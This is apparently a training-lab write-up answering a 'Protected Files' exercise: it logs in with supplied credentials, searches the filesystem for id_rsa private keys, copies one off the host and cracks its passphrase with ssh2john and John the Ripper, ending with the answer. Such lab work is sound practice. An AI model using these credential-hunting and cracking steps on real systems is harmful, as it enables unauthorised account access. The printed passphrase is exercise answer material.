# Protected Files

### Use the cracked password of the user Kira and log in to the host and crack the "id\_rsa" SSH key. Then, submit the password for the SSH key as the answer.

```bash
#creds kira:L0vey0u1!
ssh kira@10.129.202.64
find / -name *id_rsa* 2>/dev/null
#/home/kira/.ssh/id_rsa
#/home/kira/.ssh/id_rsa.pub
```

lets copy that into our kali then crack it

```bash
scp kira@10.129.202.64:/home/kira/.ssh/id_rsa .  
ssh2john id_rsa > ssh.hash  
john --wordlist=/usr/share/wordlists/rockyou.txt ssh.hash
#L0veme           (id_rsa)     
```

L0veme
